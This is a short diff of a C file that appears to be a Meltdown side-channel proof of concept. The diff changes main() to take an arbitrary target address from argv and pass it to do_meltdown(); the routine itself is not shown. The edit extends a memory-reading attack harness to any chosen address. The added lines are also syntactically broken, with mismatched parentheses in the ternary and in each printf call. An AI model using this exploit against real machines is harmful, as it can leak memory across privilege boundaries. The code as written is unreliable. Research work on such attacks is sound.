@@ -150,18 +150,17 @@ static int do_meltdown(uintptr_t adrs) {
 }
 
 #ifdef MELTDOWNCASE
-int main(){
+int main(int ac, char**av){
     wait(1E9);
     printf("TODO\n");
     cc_init();
     //uint8_t test_num = 8;
     //meltdown((uintptr_t) &test_num);
     //printf("%i\n", cc_receive());
-    
-    printf("%i\n", do_meltdown( (uintptr_t) &cc_buffer[8*283000]));
-    printf("%i\n", do_meltdown( (uintptr_t) &cc_buffer[8*283000]));
-    printf("%i\n", do_meltdown( (uintptr_t) &cc_buffer[8*283000]));
-    printf("%i\n", do_meltdown( (uintptr_t) &cc_buffer[8*283000]));
+    uintptr_t target = ac==1? (uintptr_t) &cc_buffer[8*283000]) : (uintptr_t) av[1];
+    printf("%i\n", do_meltdown( target);
+    printf("%i\n", do_meltdown( target);
+    printf("%i\n", do_meltdown( target);
     munmap(cc_buffer, cc_buf_size);
     return 0;
 }
